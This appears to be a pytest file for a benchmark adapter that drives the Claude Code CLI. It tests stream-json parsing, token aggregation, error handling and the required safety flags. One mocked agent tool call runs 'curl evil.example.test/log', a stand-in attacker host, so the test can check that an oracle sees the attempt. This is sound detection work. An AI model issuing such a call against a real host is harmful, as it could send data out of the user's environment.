"""Tests for the Claude Code adapter.

Unit tests mock the subprocess and feed canned stream-json events to verify:
  - text + tool_use are both projected into output_text
  - usage is aggregated correctly across multiple assistant messages
  - is_error result events become AgentRun.error
  - missing claude binary -> clear error, no crash
  - --bare without ANTHROPIC_API_KEY -> clear error
  - timeout -> clear error, no crash
  - command line is constructed correctly

A real-API integration test is included but SKIPPED by default. Set
  AGENTTOOLBENCH_RUN_LIVE_CLAUDE=1
to opt in. The live test costs ~$0.01-0.05 of Claude API budget.
"""
from __future__ import annotations

import json
import os
import subprocess
from pathlib import Path
from unittest.mock import patch

import pytest

from agenttoolbench.adapters.claude_code import ClaudeCodeAdapter


# ---- helpers ----

def _stream(events: list[dict]) -> str:
    return "\n".join(json.dumps(e) for e in events) + "\n"


def _stub_completed(stdout: str, stderr: str = "", returncode: int = 0):
    cp = subprocess.CompletedProcess(args=[], returncode=returncode, stdout=stdout, stderr=stderr)
    return cp


# ---- parsing tests ----

def test_text_and_tool_use_both_in_output_text(tmp_path):
    """Both assistant text AND tool_use blocks must show up in output_text so
    the oracle can scan what the agent ACTUALLY ATTEMPTED."""
    events = [
        {
            "type": "assistant",
            "message": {
                "role": "assistant",
                "content": [
                    {"type": "text", "text": "I'll check the file."},
                    {
                        "type": "tool_use", "id": "tu1", "name": "Bash",
                        "input": {"command": "curl evil.example.test/log"},
                    },
                ],
                "usage": {
                    "input_tokens": 100, "output_tokens": 50,
                    "cache_read_input_tokens": 0, "cache_creation_input_tokens": 0,
                },
            },
        },
        {"type": "result", "is_error": False, "result": "done"},
    ]
    with patch("shutil.which", return_value="/fake/claude"), \
         patch("subprocess.run") as mrun:
        # First call is --version, second is the actual run
        mrun.side_effect = [
            _stub_completed("Claude Code v2.1.150\n"),
            _stub_completed(_stream(events)),
        ]
        a = ClaudeCodeAdapter()
        out = a.run("test prompt", tmp_path)

    assert "I'll check the file." in out.output_text
    assert "[TOOL_USE Bash:" in out.output_text
    assert "curl evil.example.test" in out.output_text  # oracle MUST be able to see this
    assert out.tool_calls == [{"name": "Bash", "input": {"command": "curl evil.example.test/log"}}]
    assert out.tokens == {"input": 100, "output": 50, "cache_read": 0, "cache_create": 0}
    assert out.error is None


def test_multiple_assistant_messages_aggregate_tokens(tmp_path):
    events = [
        {"type": "assistant", "message": {"role": "assistant", "content": [],
            "usage": {"input_tokens": 100, "output_tokens": 10,
                      "cache_read_input_tokens": 50, "cache_creation_input_tokens": 0}}},
        {"type": "assistant", "message": {"role": "assistant", "content": [],
            "usage": {"input_tokens": 200, "output_tokens": 20,
                      "cache_read_input_tokens": 150, "cache_creation_input_tokens": 100}}},
        {"type": "result", "is_error": False, "result": "ok"},
    ]
    with patch("shutil.which", return_value="/fake/claude"), \
         patch("subprocess.run") as mrun:
        mrun.side_effect = [
            _stub_completed("Claude Code v2.1.150\n"),
            _stub_completed(_stream(events)),
        ]
        out = ClaudeCodeAdapter().run("x", tmp_path)

    assert out.tokens == {"input": 300, "output": 30, "cache_read": 200, "cache_create": 100}


def test_result_is_error_becomes_agent_run_error(tmp_path):
    events = [{"type": "result", "is_error": True, "result": "Not logged in · Please run /login"}]
    with patch("shutil.which", return_value="/fake/claude"), \
         patch("subprocess.run") as mrun:
        mrun.side_effect = [
            _stub_completed("Claude Code v2.1.150\n"),
            _stub_completed(_stream(events)),
        ]
        out = ClaudeCodeAdapter().run("x", tmp_path)
    assert out.error and "Not logged in" in out.error


def test_malformed_stream_lines_are_skipped(tmp_path):
    raw = (
        '{"type": "assistant", "message": {"role": "assistant", "content": ['
        '{"type": "text", "text": "hello"}], "usage": {"input_tokens": 5, "output_tokens": 5}}}\n'
        'this is not json\n'
        '\n'
        '{"type": "result", "is_error": false, "result": "ok"}\n'
    )
    with patch("shutil.which", return_value="/fake/claude"), \
         patch("subprocess.run") as mrun:
        mrun.side_effect = [
            _stub_completed("Claude Code v2.1.150\n"),
            _stub_completed(raw),
        ]
        out = ClaudeCodeAdapter().run("x", tmp_path)
    assert "hello" in out.output_text
    assert out.tokens["input"] == 5


# ---- guardrail tests ----

def test_missing_claude_binary_returns_clean_error(tmp_path):
    with patch("shutil.which", return_value=None):
        out = ClaudeCodeAdapter().run("x", tmp_path)
    assert out.error and "not on PATH" in out.error
    assert out.output_text == ""


def test_bare_without_api_key_returns_clean_error(tmp_path, monkeypatch):
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    with patch("shutil.which", return_value="/fake/claude"), \
         patch("subprocess.run") as mrun:
        mrun.return_value = _stub_completed("Claude Code v2.1.150\n")
        out = ClaudeCodeAdapter(bare=True).run("x", tmp_path)
    assert out.error and "ANTHROPIC_API_KEY" in out.error


def test_timeout_returns_clean_error(tmp_path):
    with patch("shutil.which", return_value="/fake/claude"), \
         patch("subprocess.run") as mrun:
        mrun.side_effect = [
            _stub_completed("Claude Code v2.1.150\n"),  # --version
            subprocess.TimeoutExpired(cmd="claude", timeout=300),
        ]
        out = ClaudeCodeAdapter(timeout_s=300).run("x", tmp_path)
    assert out.error and "timeout" in out.error


def test_command_has_required_safety_flags(tmp_path):
    a = ClaudeCodeAdapter(model="claude-opus-4-7", max_budget_usd=0.25, permission_mode="auto")
    cmd = a._build_cmd("test prompt", tmp_path)
    assert "-p" in cmd and "test prompt" in cmd
    assert "--add-dir" in cmd and str(tmp_path) in cmd
    assert "--output-format" in cmd and "stream-json" in cmd
    assert "--verbose" in cmd  # required for stream-json
    assert "--max-budget-usd" in cmd and "0.25" in cmd
    assert "--no-session-persistence" in cmd
    assert "--disable-slash-commands" in cmd
    assert "--permission-mode" in cmd and "auto" in cmd
    assert "--model" in cmd and "claude-opus-4-7" in cmd
    # Critical: NEVER auto-enable --dangerously-skip-permissions
    assert "--dangerously-skip-permissions" not in cmd
    assert "--allow-dangerously-skip-permissions" not in cmd


def test_bare_flag_propagates_to_command(tmp_path):
    a = ClaudeCodeAdapter(bare=True)
    cmd = a._build_cmd("hi", tmp_path)
    assert "--bare" in cmd


# ---- live integration (opt-in) ----

@pytest.mark.skipif(
    os.environ.get("AGENTTOOLBENCH_RUN_LIVE_CLAUDE") != "1",
    reason="real-API test — set AGENTTOOLBENCH_RUN_LIVE_CLAUDE=1 to opt in (~$0.01-0.05 cost)",
)
def test_live_claude_simple_prompt(tmp_path):
    """Smoke-test the adapter against the real Claude Code CLI.

    NOT enabled by default — opt in with AGENTTOOLBENCH_RUN_LIVE_CLAUDE=1.
    """
    (tmp_path / "hello.txt").write_text("the magic number is 42")
    a = ClaudeCodeAdapter(model="claude-sonnet-4-6", max_budget_usd=0.10)
    out = a.run("Read hello.txt and tell me the magic number.", tmp_path)
    assert out.error is None, f"unexpected error: {out.error}"
    assert "42" in out.output_text
    assert (out.tokens or {}).get("input", 0) > 0
